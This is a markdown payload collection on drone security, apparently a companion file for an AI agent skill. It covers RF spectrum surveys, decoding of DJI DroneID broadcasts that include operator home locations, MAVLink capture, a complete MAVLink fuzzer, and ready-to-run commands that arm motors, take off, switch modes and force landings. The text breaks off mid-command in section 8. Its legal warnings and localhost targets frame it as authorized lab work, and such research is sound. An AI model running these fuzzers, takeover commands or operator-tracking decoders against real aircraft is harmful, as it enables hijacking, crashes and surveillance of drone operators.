# UAV / Drone Security Payloads

> Companion to `SKILL.md` — complete payload collection organized by attack type.
> All active RF commands (transmit, spoof, jam, replay) assume a Faraday cage, a shielded range, or experimental FCC authorization. 18 U.S.C. § 32 makes interfering with any aircraft — including drones you do not own — a federal felony in the USA. Always obtain written authorization from the aircraft owner and the autopilot vendor before any active testing.

---

## 1. Drone Ecosystem — Open-Source vs Proprietary

```bash
# === OPEN-SOURCE AUTOPILOTS ===

# PX4-Autopilot — BSD license, widely used in research and commercial drones
git clone https://github.com/PX4/PX4-Autopilot.git --recursive
cd PX4-Autopilot && make px4_sitl jmavsim

# ArduPilot — GPLv3, the other major open-source autopilot
git clone https://github.com/ArduPilot/ardupilot.git --recursive
cd ardupilot && sim_vehicle.py -v ArduCopter -f quad --map --console

# MAVLink protocol library (pymavlink) — Python bindings for MAVLink 1/2
pip3 install pymavlink

# === PROPRIETARY DRONES ===

# DJI — largest commercial vendor. Phantom / Mavic / Mini / Inspire / Matrice lines.
# DroneID is broadcast continuously and decodable with SDR.
# Firmware: dji_system.bin, AUAV modules run busybox Linux.

# Parrot — Linux-based (ANAFI series uses PDrAW protocol over WiFi)
# FreeFlight mobile app is MITM-able.

# Skydio — US-made autonomous drones. Management interfaces over WiFi + LTE.
# Custom video link protocol.

# Autel Robotics — EVO series, partially DroneID-compatible.

# Yuneec — Typhoon/Breeze, less common in research.

# === MICRO DRONES (Lab targets) ===

# Bitcraze Crazyflie 2.1 — open-source nano drone for security research
git clone https://github.com/bitcraze/crazyflie-firmware.git
# Controlled via Crazyradio PA (nRF24LU1+ 2.4 GHz USB dongle)

# DSM2/DSMX receivers (Spektrum) — common in RC aircraft, fixed-code vulnerabilities
```

```bash
# Identify drone ecosystems by their RF signatures
# 2.4 GHz:
#   - DJI OcuSync/O3 — proprietary digital link, ~10 MHz BW, FHSS
#   - FrSky D16/D8 — FHSS, 80 channels, ~2 MHz BW per hop
#   - ELRS/CRSF — open-source FHSS, 150 Hz packet rate
#   - Crazyflie — GFSK 2 Mbps, custom protocol on nRF24L01+
#   - WiFi (DJI Osmo, Skydio, Parrot) — 802.11 b/g/n

# 5.8 GHz:
#   - Analog FPV — NTSC/PAL over FM, 36 channels at 5.725-5.875 GHz
#   - DJI O3 / Walksnail / HDZero / FatShark — digital video links

# 900 MHz (USA/AU telemetry):
#   - MAVLink over 3DR Radio / RFD900 / Holybro
#   - LTE/4G cellular modems on commercial drones (DJI Smart Controller)

# 433 MHz (EU telemetry):
#   - MAVLink over 433 MHz radio modules

# GPS/GNSS bands (receive-only on drone):
#   - L1 C/A: 1575.42 MHz
#   - L2C: 1227.60 MHz
#   - Galileo E1: 1575.42 MHz
#   - BeiDou B1I: 1561.098 MHz
```

```bash
# Install the canonical toolchain on Kali Linux
sudo apt update
sudo apt install -y \
  gnuradio gr-osmosdr hackrf rtl-sdr urh gqrx inspectrum \
  wireshark tshark \
  python3-pip px4-dev ardupilot-tools

pip3 install --user pymavlink mavproxy dronekit cantools

# Verify
hackrf_info
rtl_test -t
python3 -c "import pymavlink; print(pymavlink.__version__)"
mavproxy.py --version
```

---

## 2. RF Spectrum Recon — HackRF / GQRX / 2.4 GHz / 5.8 GHz / FHSS Detection

```bash
# === 2.4 GHz ISM Band Survey ===

# Wideband sweep of the entire 2.4 GHz ISM band (2400-2500 MHz)
hackrf_sweep -f 2400:2500 -l 32 -g 30 -w 1000000 -1 > sweep_2400.csv

# Real-time waterfall with GQRX
gqrx -c drone_recon.conf -s 8000000 -f 2440000000

# Power-vs-frequency scan with higher resolution
rtl_power -f 2400M:2500M:500k -i 1 -e 60 band_2400.csv

# Generate a heatmap
python3 -m urh.heatmap band_2400.csv

# Identify bursts above noise floor
awk -F, '$6 > -50 {print $4, $5, $6}' band_2400.csv | head -20
```

```bash
# === 5.8 GHz FPV Video Band Survey ===

# 5.8 GHz band is 5725-5875 MHz (5.8 GHz FPV channels)
# HackRF One supports this; RTL-SDR v3 does NOT (max ~1.7 GHz)

hackrf_sweep -f 5725:5875 -l 32 -g 30 -w 1000000 -1 > sweep_5800.csv

# Specific FPV channels (5.8 GHz analog FPV channel map):
#   CH1  5740  CH2  5760  CH3  5780  CH4  5800  CH5  5820  CH6  5840
#   CH7  5860  CH8  (Race Band adds 5705, 5685, 5665, 5645)

# Capture a single FPV channel for inspection
hackrf_transfer -r fpv_ch5.raw -f 5820000000 -s 20000000 -l 32 -g 30 -n 200000000

# Demodulate analog FM video (NTSC) with GNURadio
# Build flowgraph: Osmocom Source (5820 MHz, 20 MSPS) -> Quadrature Demod
# -> Low Pass Filter -> Rational Resampler -> Float to UChar -> File Sink
gnuradio-companion fpv_demod.grc
```

```bash
# === 900 MHz Telemetry Band (USA/AU) ===

# 902-928 MHz ISM band — common for MAVLink telemetry radios
rtl_power -f 902M:928M:100k -i 1 -e 60 band_900.csv

# Capture a MAVLink telemetry burst at 915 MHz
hackrf_transfer -r mavlink_915.raw -f 915000000 -s 2000000 -l 32 -g 30 -n 20000000

# Demodulate FSK (typical for 3DR Radio / RFD900)
# Baudrate is usually 57.6k or 115.2k
# Use URH: urh mavlink_915.raw
```

```bash
# === FHSS Detection (Frequency Hopping Spread Spectrum) ===

# Capture the FULL 2.4 GHz band at 20 MSPS for at least 30 seconds
# This allows recovery of the full hopping sequence (FrSky/FlySky/ELRS)
hackrf_transfer -r fhss_full_2400.raw -f 2450000000 -s 20000000 -l 32 -g 30 -n 1200000000

# Open in inspectrum to see hop pattern
inspectrum fhss_full_2400.raw -r 20000000 -f 2450000000

# Auto-detect hop channels (looks for bursts above noise floor)
python3 << 'EOF'
import numpy as np
samples = np.fromfile('fhss_full_2400.raw', dtype=np.int8)
complex_samples = samples[0::2] + 1j * samples[1::2]
fs = 20e6
n_fft = 256
hop_windows = []
for i in range(0, len(complex_samples) - n_fft, n_fft):
    window = complex_samples[i:i+n_fft]
    fft = np.fft.fftshift(np.fft.fft(window))
    power = 20*np.log10(np.abs(fft)+1e-12)
    peak_bin = np.argmax(power)
    peak_freq_mhz = 2450 + (peak_bin - n_fft/2) * (fs/n_fft) / 1e6
    peak_power = power[peak_bin]
    if peak_power > -30:
        time_s = (i / fs)
        hop_windows.append((time_s, peak_freq_mhz, peak_power))
print(f"Detected {len(hop_windows)} hops in capture")
print(f"Unique channels: {len(set(round(f,1) for _,f,_ in hop_windows))}")
for t, f, p in hop_windows[:20]:
    print(f"  t={t:.3f}s  freq={f:.1f} MHz  pwr={p:.1f} dB")
EOF
```

---

## 3. DroneID Decoding — DJI Identification Protocol

```bash
# === DJI DroneID Background ===
# DroneID is a DJI-specific broadcast that includes:
#   - Aircraft serial number
#   - Aircraft position (lat/lon/alt)
#   - Aircraft velocity
#   - Home position (operator location lat/lon)
#   - Aircraft state (in-flight, returning, etc.)
#
# Broadcast on 2.4 GHz (and 5.8 GHz on some models) alongside the
# control/video link. Decodable by anyone in receive range.
# Used by DJI AeroScope for law-enforcement tracking.

# === Open DroneID Tools ===

# trendmicro/DroneID-timeline — wireshark dissector + python tools
git clone https://github.com/trendmicro/DroneID-timeline.git
cd DroneID-timeline

# Alternative: loosebianky/DroneID (gnuradio out-of-tree module)
git clone https://github.com/loosebianky/DroneID.git

# Or use the OET/OpenDroneID wireshark plugin
# (the FCC-mandated Remote ID is similar but uses BLE/WiFi Beacon)

# === Capture DroneID with HackRF ===

# Capture 2.4 GHz wideband for DroneID (10 seconds)
hackrf_transfer -r droneid_2440.raw -f 2440000000 -s 20000000 -l 32 -g 30 -n 200000000

# Process with the DroneID gnuradio demodulator
grcc droneid_demod.grc
# or run the flowgraph directly:
gnuradio-companion -r DroneID/gr-droneid/examples/top_block.py

# === Wireshark DroneID Dissector ===

# Copy the DroneID lua dissector into wireshark plugins
mkdir -p ~/.local/share/wireshark/plugins
cp DroneID-timeline/droneid.lua ~/.local/share/wireshark/plugins/

# Inspect a captured DroneID pcap
wireshark -r droneid_decoded.pcap -Y "droneid" -V

# Extract key fields with tshark
tshark -r droneid_decoded.pcap -Y "droneid" -T fields \
  -e droneid.serial_number \
  -e droneid.drone_lat -e droneid.drone_lon -e droneid.drone_alt \
  -e droneid.home_lat -e droneid.home_lon 2>&1 | head -20
```

```python
#!/usr/bin/env python3
"""
DroneID field decoder — parses DJI DroneID frames from a captured pcap.
Reference: DroneID message set (trendmicro/DroneID-timeline).
"""
import struct
from scapy.all import rdpcap, Raw

def parse_droneid(payload: bytes) -> dict:
    """Parse a DroneID frame payload into fields.
    Frame structure (simplified, version-dependent):
      - Header (sync word + version)
      - Message type
      - Sub-message(s): state, location, attitude, etc.
    """
    if len(payload) < 10:
        return {}
    out = {}
    # Sync word check (varies by drone generation)
    if payload[0:2] not in (b'\x90\x02', b'\x91\x02'):
        return {}
    msg_type = payload[4]
    out['msg_type'] = msg_type
    try:
        if msg_type == 0x10:  # Aircraft location message
            lat_raw = struct.unpack('<i', payload[10:14])[0]
            lon_raw = struct.unpack('<i', payload[14:18])[0]
            alt_raw = struct.unpack('<H', payload[18:20])[0]
            out['drone_lat'] = lat_raw / 1e7
            out['drone_lon'] = lon_raw / 1e7
            out['drone_alt'] = alt_raw / 10.0
        elif msg_type == 0x11:  # Home location message
            lat_raw = struct.unpack('<i', payload[10:14])[0]
            lon_raw = struct.unpack('<i', payload[14:18])[0]
            out['home_lat'] = lat_raw / 1e7
            out['home_lon'] = lon_raw / 1e7
        elif msg_type == 0x00:  # Basic ID (serial number)
            serial = payload[10:30].split(b'\x00')[0].decode('ascii', errors='ignore')
            out['serial_number'] = serial
    except (struct.error, UnicodeDecodeError):
        pass
    return out

if __name__ == '__main__':
    pkts = rdpcap('droneid_decoded.pcap')
    for pkt in pkts:
        if Raw in pkt and len(pkt[Raw].load) > 10:
            fields = parse_droneid(bytes(pkt[Raw].load))
            if fields:
                print(fields)
```

```bash
# === AeroScope (commercial DroneID receiver) ===

# DJI AeroScope is the vendor product for DroneID reception.
# It is not openly documented; researchers reverse-engineered DroneID
# to build open-source alternatives (DroneID-timeline, OpenDroneID).

# AeroScope web API (where deployed in a facility)
# Documented at https://developer.dji.com (registration required)
# Never test against an AeroScope you do not own.

# === OpenDroneID (ASTM F3411) ===

# The FCC Remote ID rule (effective 2024) mandates similar broadcast
# for all drones > 250 g in the USA. ASTM F3411 specifies:
#   - BLE Beacon (legacy)
#   - WiFi Beacon (2.4 / 5 GHz)
#   - NASA UAS Service Supplier (Network Remote ID)

# Decode ASTM Remote ID with wireshark (built-in dissector):
tshark -i wlan0mon -Y "bthci_cmd.opcode == 0x0000" -V | grep -i "remote.?id"
tshark -i wlan0mon -Y "wlan.fc.type_subtype == 0x0008" -V | grep -i "remote.?id"
```

---

## 4. MAVLink Protocol — Packet Structure and Common Messages

```python
#!/usr/bin/env python3
"""
MAVLink packet structure (v1 and v2) — for hand-rolled fuzzing.
Reference: MAVLink wire protocol specification (mavlink.io).

MAVLink 1 packet:
  +---------+--------+---------+----------+------------+-----------+
  | Stx (1) | Plen(1) | Seq(1)  | Sysid(1) | Compid(1)  | Msgid(1)  |
  +---------+--------+---------+----------+------------+-----------+
  | Payload (0-255 bytes)                                         |
  +---------------------------------------------------------------+
  | Crc (2, little-endian, includes CRC_EXTRA)                    |
  +---------------------------------------------------------------+

MAVLink 2 packet adds:
  - Incompat_flags (1) — bit 0 = signed packet (signature follows)
  - Compat_flags (1)
  - Msgid extended to 24 bits (3 bytes)
  - Optional signature (13 bytes) if incompat_flags bit 0 set

Stx values: 0xFE (MAVLink 1), 0xFD (MAVLink 2)
"""

MAVLINK_STX_V1 = 0xFE
MAVLINK_STX_V2 = 0xFD

def build_mavlink_v1_heartbeat(sysid: int = 1, compid: int = 1) -> bytes:
    """Build a minimal MAVLink 1 HEARTBEAT (msgid 0).
    Payload (9 bytes): type(1) autopilot(1) base_mode(1)
                       custom_mode(4) system_status(1) mavlink_version(1)
    CRC_EXTRA for HEARTBEAT = 50 (computed from XML; constant per msg).
    """
    stx = bytes([MAVLINK_STX_V1])
    payload_len = 9
    seq = 0
    msgid = 0  # HEARTBEAT
    payload = bytes([
        2,    # type = MAV_TYPE_QUADROTOR
        3,    # autopilot = MAV_AUTOPILOT_ARDUPILOTMEGA
        217,  # base_mode = MAV_MODE_FLAG_SAFETY_ARMED | CUSTOM_MODE_ENABLED | ...
        0, 4, 0, 0,  # custom_mode = 1024 (e.g. ArduCopter LOITER)
        4,    # system_status = MAV_STATE_ACTIVE
        3,    # mavlink_version = 3
    ])
    header = bytes([payload_len, seq, sysid, compid, msgid])
    crc_extra = 50  # HEARTBEAT
    # CRC implementation per mavlink crc16_x25
    import pymavlink.dialects.v20.ardupilotmega as ap_dialect
    from pymavlink import mavutil
    msg = mavutil.mavlink.MAVLink_heartbeat_message(
        type=2, autopilot=3, base_mode=217, custom_mode=1024, system_status=4, mavlink_version=3)
    msg.pack(mavutil.mavlink.MAVLink(0, 1))
    return msg.get_msgbuf()

# Common MAVLink messages worth understanding:
#   msgid 0    HEARTBEAT — periodic, identifies vehicle
#   msgid 1    SYS_STATUS — battery, drop rate, errors
#   msgid 2    SYSTEM_TIME — autopilot clock
#   msgid 11   SET_MODE — change flight mode (DANGER)
#   msgid 21   PARAM_REQUEST_READ — request one param
#   msgid 22   PARAM_REQUEST_LIST — dump all params
#   msgid 23   PARAM_VALUE — param response
#   msgid 26   HEARTBEAT (GCS)
#   msgid 39   MISSION_ITEM (waypoint)
#   msgid 44   MISSION_COUNT
#   msgid 76   COMMAND_LONG — generic command (arm, takeoff, RTL, etc.) (DANGER)
#   msgid 147  AUTOPILOT_VERSION — firmware version
#   msgid 300  PROTOCOL_VERSION — MAVLink version
#   msgid 334  HEARTBEAT (companion computer)
```

```bash
# === Inspect MAVLink traffic live with tshark ===

# Capture MAVLink on UDP 14550 (default GCS port) with native dissector
tshark -i any -f "udp port 14550" -Y "mavlink" \
  -T fields -e frame.time_relative \
  -e mavlink.sysid -e mavlink.compid -e mavlink.msgid \
  -e mavlink.msgname 2>&1 | head -30

# Identify heartbeat type/autopilot pair (reveals PX4 vs ArduPilot vs others)
# type values: 0=generic, 1=fixed-wing, 2=quad, 4=helicopter, ...
# autopilot values: 0=generic, 3=ArduPilot, 12=PX4, ...
tshark -i any -f "udp port 14550" -Y "mavlink.msgid == 0" \
  -T fields -e mavlink.heartbeat.type \
  -e mavlink.heartbeat.autopilot \
  -e mavlink.heartbeat.mavlink_version

# Decode COMMAND_LONG messages (arm/takeoff/RTL)
tshark -i any -f "udp port 14550" -Y "mavlink.msgid == 76" \
  -T fields -e mavlink.command_long.command \
  -e mavlink.command_long.param1 \
  -e mavlink.command_long.param2

# Save a filtered MAVLink-only pcap
tshark -i any -f "udp portrange 14550-14551 or tcp portrange 5760-5762" \
  -w mavlink_full.pcap
```

```bash
# === MAVLink 1 vs MAVLink 2 Detection ===

# MAVLink 1 packets start with 0xFE (254)
# MAVLink 2 packets start with 0xFD (253)

tshark -i any -f "udp port 14550" -x | head -3
# First byte of each UDP payload reveals the version.

# Check incompat_flags for signed packets (rare)
tshark -r mavlink_full.pcap -Y "mavlink" -T fields \
  -e mavlink.incompat_flags -e mavlink.compat_flags | sort -u
# incompat_flags bit 0 set = signed packet; signature follows payload.

# Inspect a signed MAVLink 2 packet (if present)
tshark -r mavlink_full.pcap -Y "mavlink.incompat_flags == 1" -V | head -40
```

---

## 5. MAVLink Capture — tshark / MAVProxy / pymavlink

```bash
# === MAVProxy as a passive tap ===

# Attach MAVProxy to a SITL autopilot (PX4 or ArduPilot)
# PX4 SITL on TCP 4560:
mavproxy.py --master=tcp:127.0.0.1:4560 --console --map --state-basedir=/tmp/mavproxy

# MAVProxy command-line inspection (inside the console):
param show COM_*
param show NAV_*
mode
arm throttle
status

# Log all MAVLink traffic to a file for offline analysis
mavproxy.py --master=tcp:127.0.0.1:4560 \
  --logfile=/tmp/mavlink.log \
  --streamrate=10

# Convert MAVProxy log to pcap (for wireshark)
# Use pymavlink.mavlogdump:
python3 -m pymavlink.tools.mavlogdump /tmp/mavlink.log | head
```

```python
#!/usr/bin/env python3
"""
pymavlink-based MAVLink capture and replay.
Connects to a MAVLink source (SITL, telemetry radio, or replayed log),
logs every packet, and supports targeted message injection.

Run as: python3 mavlink_capture.py --connect tcp:127.0.0.1:4560
"""
import argparse
import time
from pymavlink import mavutil

def capture(connect_str: str, output_log: str):
    """Capture all MAVLink traffic to a log file."""
    conn = mavutil.mavlink_connection(connect_str, autoreconnect=True)
    # Wait for initial heartbeat
    conn.wait_heartbeat()
    print(f"[+] Connected. Target sysid={conn.target_system} compid={conn.target_component}")
    print(f"[+] Autopilot reported: {conn.flightmode}")

    msg_count = 0
    start = time.time()
    with open(output_log, 'w') as f:
        f.write(f"# MAVLink capture {connect_str} {time.ctime(start)}\n")
        while time.time() - start < 300:  # 5 minutes
            msg = conn.recv_match(blocking=True, timeout=1)
            if msg is None:
                continue
            msg_count += 1
            ts = time.time()
            f.write(f"{ts:.6f} {msg}\n")
            if msg_count % 100 == 0:
                f.flush()
                print(f"[+] {msg_count} messages captured ({time.time()-start:.0f}s)")

    print(f"[+] Capture complete: {msg_count} messages in {output_log}")

if __name__ == '__main__':
    p = argparse.ArgumentParser()
    p.add_argument('--connect', required=True,
                   help='MAVLink connection string (tcp:host:port, udpin:port, /dev/ttyUSB0)')
    p.add_argument('--output', default='mavlink_capture.mavlog')
    args = p.parse_args()
    capture(args.connect, args.output)
```

```bash
# === Scapy for MAVLink Sniffing ===

# scapy.contrib.mavlink layer (recent scapy versions)
python3 << 'EOF'
from scapy.all import sniff, UDP
from scapy.contrib.mavlink import MAVLink_header, MAVLink_heartbeat

def callback(pkt):
    if UDP in pkt and pkt[UDP].sport in (14550, 14551, 5760, 5762):
        try:
            payload = bytes(pkt[UDP].payload)
            if payload[0] == 0xFD:  # MAVLink 2
                # Use the native pymavlink decoder for full message support
                from pymavlink import mavutil
                conn = mavutil.mavlink_connection(
                    'udpin:0.0.0.0:0',
                    input=True,
                    source_system=255,
                )
                msg = conn.decode(payload)
                if msg:
                    print(f"[MAVLink] {msg.get_type()}: {msg}")
        except Exception as e:
            pass

# Sniff MAVLink on the loopback (SITL) or any interface
sniff(iface='lo', filter='udp port 14550', prn=callback, store=False)
EOF
```

---

## 6. MAVLink Fuzzing — scapy / Custom Fuzzers / Invalid Heartbeat

```python
#!/usr/bin/env python3
"""
MAVLink fuzzer — sends malformed/edge-case MAVLink packets to an autopilot.
Tests: heartbeat corruption, COMMAND_LONG arm with bad params, oversized
PARAM_VALUE, SET_MODE to invalid mode, MAVFTP abuse.

Use ONLY against an authorized SITL or your own hardware.
"""
import socket
import random
import struct
import time
from pymavlink import mavutil

class MAVLinkFuzzer:
    def __init__(self, target_ip: str, target_port: int = 14550,
                 source_sysid: int = 255, source_compid: int = 0):
        self.target = (target_ip, target_port)
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # Build a MAVLink connection bound to our socket
        self.mav = mavutil.mavlink.MAVLink(self.sock, source_sysid)
        self.mav.srcSystem = source_sysid
        self.mav.srcComponent = source_compid

    def fuzz_heartbeat(self):
        """Send heartbeat with every possible type/autopilot combination."""
        print("[*] Fuzz: HEARTBEAT type/autopilot enumeration")
        for mav_type in range(0, 18):
            for autopilot in range(0, 18):
                self.mav.heartbeat_send(
                    type=mav_type,
                    autopilot=autopilot,
                    base_mode=0,
                    custom_mode=0,
                    system_status=0,
                    mavlink_version=3,
                )
                time.sleep(0.01)

    def fuzz_command_long(self):
        """Send COMMAND_LONG with every MAV_CMD id."""
        print("[*] Fuzz: COMMAND_LONG command id enumeration")
        for cmd in range(0, 600):
            try:
                self.mav.command_long_send(
                    target_system=1, target_component=1,
                    command=cmd, confirmation=0,
                    param1=random.uniform(-1e6, 1e6),
                    param2=random.uniform(-1e6, 1e6),
                    param3=random.uniform(-1e6, 1e6),
                    param4=random.uniform(-1e6, 1e6),
                    param5=random.uniform(-1e6, 1e6),
                    param6=random.uniform(-1e6, 1e6),
                    param7=random.uniform(-1e6, 1e6),
                )
                time.sleep(0.05)
            except Exception as e:
                print(f"  cmd {cmd}: exception {e}")

    def fuzz_set_mode(self):
        """Send SET_MODE with bad base_mode and custom_mode."""
        print("[*] Fuzz: SET_MODE to invalid mode values")
        for base_mode in (1, 2, 4, 8, 16, 32, 64, 128, 255):
            for custom_mode in (0, 0xFFFFFFFF, 0x80000000, random.randint(0, 1<<32)):
                self.mav.set_mode_send(
                    target_system=1,
                    base_mode=base_mode,
                    custom_mode=custom_mode,
                )
                time.sleep(0.02)

    def fuzz_oversized_param_value(self):
        """Send PARAM_VALUE with oversized param_id (CVE-style buffer test)."""
        print("[*] Fuzz: PARAM_VALUE oversized param_id")
        # param_id is 16 bytes; send longer strings
        for length in (15, 16, 17, 32, 64, 128):
            oversized = b'A' * length
            self.mav.param_value_send(
                param_id=oversized[:16].decode('ascii', errors='ignore'),
                param_value=1.0,
                param_type=mavutil.mavlink.MAV_PARAM_TYPE_REAL32,
                param_count=1,
                param_index=0,
            )
            time.sleep(0.05)

    def fuzz_invalid_crc(self):
        """Send packets with intentionally bad CRC (autopilot should drop)."""
        print("[*] Fuzz: invalid CRC injection")
        # Build a valid packet then flip the last byte (CRC)
        valid = self.mav.heartbeat_encode(
            type=2, autopilot=3, base_mode=0, custom_mode=0,
            system_status=4, mavlink_version=3).pack(self.mav)
        corrupt = bytearray(valid)
        corrupt[-1] ^= 0xFF  # flip last CRC byte
        self.sock.sendto(bytes(corrupt), self.target)

    def run_all(self):
        self.fuzz_heartbeat()
        self.fuzz_command_long()
        self.fuzz_set_mode()
        self.fuzz_oversized_param_value()
        self.fuzz_invalid_crc()
        print("[+] Fuzz pass complete")

if __name__ == '__main__':
    fuzzer = MAVLinkFuzzer('127.0.0.1', 14550)
    fuzzer.run_all()
```

```bash
# === Mutiny-based MAVLink Fuzzing (Boofuzz) ===

pip3 install boofuzz

# Example boofuzz template for MAVLink heartbeat
python3 << 'EOF'
from boofuzz import *

session = Session(target=Target(connection=UDPSocketConnection('127.0.0.1', 14550)))
s_initialize('mavlink_heartbeat_v2')
s_static(b'\xfd')          # stx (MAVLink 2)
s_byte(9, name='payload_len')
s_byte(0, name='incompat_flags')
s_byte(0, name='compat_flags')
s_byte(0, name='seq')
s_byte(255, name='sysid')
s_byte(0, name='compid')
s_byte(0, name='msgid_lo')  # HEARTBEAT = 0
s_byte(0, name='msgid_mid')
s_byte(0, name='msgid_hi')
# Payload
s_byte(2, name='type')           # QUADROTOR
s_byte(3, name='autopilot')      # ARDUPILOTMEGA
s_byte(0, name='base_mode')
s_dword(0, name='custom_mode', endian='little')
s_byte(4, name='system_status')
s_byte(3, name='mavlink_version')
# CRC
s_word(0, name='crc', endian='little')
session.connect(s_get('mavlink_heartbeat_v2'))
session.fuzz()
EOF
```

```bash
# === Dangerous Commands to Test (post-fuzz) ===

# These commands can crash or take over a vulnerable autopilot.
# Only run against authorized SITL or your own hardware in a Faraday cage.

# Arm the motors
python3 -c "
from pymavlink import mavutil
m = mavutil.mavlink_connection('udp:127.0.0.1:14550')
m.wait_heartbeat()
m.mav.command_long_send(
    m.target_system, m.target_component,
    mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM,
    0, 1, 0, 0, 0, 0, 0, 0)   # param1=1 means ARM
print('ARM command sent')
"

# Takeoff (MAV_CMD_NAV_TAKEOFF)
python3 -c "
from pymavlink import mavutil
m = mavutil.mavlink_connection('udp:127.0.0.1:14550')
m.wait_heartbeat()
m.mav.command_long_send(
    m.target_system, m.target_component,
    mavutil.mavlink.MAV_CMD_NAV_TAKEOFF,
    0, 0, 0, 0, 0, 0, 0, 10)  # param7=10 means takeoff to 10m
print('TAKEOFF command sent')
"

# Change mode to AUTO (ArduPilot custom_mode 3 = AUTO)
python3 -c "
from pymavlink import mavutil
m = mavutil.mavlink_connection('udp:127.0.0.1:14550')
m.wait_heartbeat()
m.mav.set_mode_send(
    m.target_system,
    mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
    3)  # AUTO
print('SET_MODE AUTO sent')
"
```

---

## 7. PX4 Attack Surface — uORB / Mixers / Params

```bash
# === PX4 Param Dump (Authorization Required) ===

# Attach MAVProxy to PX4 SITL (TCP 4560) or hardware
mavproxy.py --master=tcp:127.0.0.1:4560

# Inside MAVProxy:
# Dump all params to a file
param save /tmp/px4_params.txt

# Look for dangerous params
param show COM_ARM_*
param show COM_RC_*
param show NAV_*
param show MAV_*
param show COM_OBS_*     # obstacle avoidance
param show RTL_*         # return-to-launch config
param show FW_*  / MC_*  # fixed-wing / multirotor tuning

# Common dangerous params to audit:
#   COM_RC_OVERRIDE       — if 1, RC sticks override AUTO mode
#   COM_RCLoss_T          — RC loss timeout (seconds to failsafe)
#   NAV_RCL_ACT           — action on RC loss (0=disabled, 1=Loiter, 2=RTL, 3=Land)
#   NAV_DLL_ACT           — action on data link loss
#   COM_OBS_AVOID_TILT    — obstacle avoidance
#   MAV_FWDEXTSP          — forward setpoints from external (companion) to GCS
#   COM_OF_LOSS           — optical flow loss action
#   RTL_RETURN_ALT        — RTL altitude
#   RTL_DESCEND_ALT       — RTL descent altitude
#   COM_ARM_CHK_ESCS      — ESC checks before arming
```

```bash
# === PX4 uORB Messaging ===
# PX4 uses uORB (micro Object Request Broker) for internal pub/sub between modules.
# Topics are documented at https://docs.px4.io/main/en/middleware/uorb_graph.html
# From a console on the Pixhawk (NSH shell):

# Connect to Pixhawk console (USB serial port, NSH shell)
screen /dev/ttyACM0 57600

# Inside NSH shell:
uorb top                           # see active topics and publish rates
uorb sensor_baro                   # stream a specific topic
listener vehicle_local_position    # monitor vehicle position
listener sensor_combined           # sensor fusion output
top                                # see CPU usage per task

# Dangerous topics:
#   vehicle_command             — incoming commands from MAVLink
#   vehicle_local_position_setpoint  — desired position
#   actuator_outputs            — final motor PWM/DShot values
#   offboard_control_mode       — companion computer control
```

```bash
# === PX4 Mixer Tables ===
# Mixers map control outputs (roll/pitch/yaw/thrust) to actuator outputs (motor PWM).
# Stored as .mix files on the microSD (/fs/microsd/etc/mixers/).

# On the Pixhawk (NSH shell):
ls /fs/microsd/etc/mixers/
cat /fs/microsd/etc/mixers/quad_x.main.mix

# Attack: a malicious mixer can swap motors (roll becomes yaw),
# invert thrust, or apply a delayed offset that destabilizes the aircraft.
# This is a supply-chain attack vector — always inspect .mix files.

# Build a custom mixer for analysis:
# https://docs.px4.io/main/en/concept/mixing.html
```

```bash
# === PX4 SITL with Gazebo (full simulation lab) ===

cd PX4-Autopilot
DONT_RUN=1 make px4_sitl gazebo-classic
./build/px4_sitl_default/bin/px4 -d etc/init.d-posix/rcS 2>&1 | tee /tmp/sitl.log

# SITL MAVLink endpoints:
#   TCP 4560 — primary link
#   UDP 14540 — offboard (companion computer) link
#   UDP 14550 — GCS link
#   UDP 14560 — SDK link (dronekit, MAVSDK)
```

---

## 8. ArduPilot Attack Surface — GCS Protocol / MAVLink Services

```bash
# === ArduPilot SITL Bring-up ===

git clone https://github.com/ArduPilot/ardupilot.git --recursive
cd ardupilot

# Bring up ArduCopter SITL
Tools/autotest/sim_vehicle.py -v ArduCopter -f quad --map --console --out=udp:127.0.0.1:14550

# Common ArduPilot vehicles:
#   ArduPlane     — fixed-wing
#   ArduCopter    — multirotor
#   ArduRover     — ground vehicle
#   ArduSub       — submarine
#   ArduBlimp     — airship

# Attach MAVProxy
mavproxy.py --master=tcp:127.0.0.1:5760 --console --map
```

```bash
# === ArduPilot Param Dump ===

# Inside MAVProxy console:
param dump /tmp/ap_params.parm

# Audit dangerous params:
param show ARMING_*       # arming checks
param show FLTMODE*       # flight mode switches
param show RTL_*          # RTL config
param show FS_*           # failsafe config
param show GPS_TYPE       # GPS receiver type ( spoofing risk varies by type )
param show EK3_*          # EKF config (GPS cross-check sensitivity)
param show SYSID_*        # MAVLink sysid/compid

# Common dangerous params:
#   ARMING_CHECK       — bitmask of pre-arm checks (0 = disable all)
#   FLTMODE1..6        — RC channel 5 mode switch values
#   FS_GCS_ENABLE      — GCS failsafe (0 = disabled)
#   FS_GPS_ENABLE      — GPS failsafe
#   FS_BATT_ENABLE     — battery failsafe
#   RTL_ALT            — RTL altitude
#   EK3_GPS_CHECK      — bitmask of GPS checks (lower = more spoofable)
```

```bash
# === ArduPilot GCS Protocol ===
# ArduPilot speaks MAVLink but adds custom messages and services.

# Custom ArduPilot MAVLink messages (extends the standard set):
#   msgid 115  NAMED_VALUE_FLOAT — custom float fields
#   msgid 174  WIND              — wind estimate
#   msgid 180  CAMERA_FEEDBACK   — camera feedback (mapping drones)
#   msgid 182  EKF_STATUS_REPORT — EKF status (GPS cross-check indicator)
#   msgid 200  MAG_CAL_PROGRESS  — magnetometer calibration
#   msgid 224  MEMINFO           — free memory
#   msgid 243  DIGICAM_CONFIGURE — camera control
#   msgid 253  STATUSTEXT        — autopilot status messages

# Check the autopilot's reported capabilities
python3 -c "
from pymavlink import mavutil
m = mavutil.mavlink_connection('udp:127.0.0.1:14550')
m.wait_heartbeat()
print(f'Autopilot: {m.flightmode}')
print(f'Version: {m.version}')
m.mav.autopilot_version_request_send(m.target_system, m.target_component)
print(m.recv_match(type='AUTOPILOT_VERSION', blocking=True, timeout=5))
"
```

```bash
# === ArduPilot Flight Modes (custom_mode in SET_MODE / HEARTBEAT) ===

# ArduCopter custom_mode values:
#   0  STABILIZE
#   1  ACRO
#   2  ALT_HOLD
#   3  AUTO
#   4  GUIDED
#   5  LOITER
#   6  RTL
#   7  CIRCLE
#   9  LAND
#  16  POSITION
#  17  SPORT / POSHOLD

# Force the aircraft to LAND via SET_MODE (DANGEROUS — authorized testing only)
python3 -c "
from pymavlink import mavutil
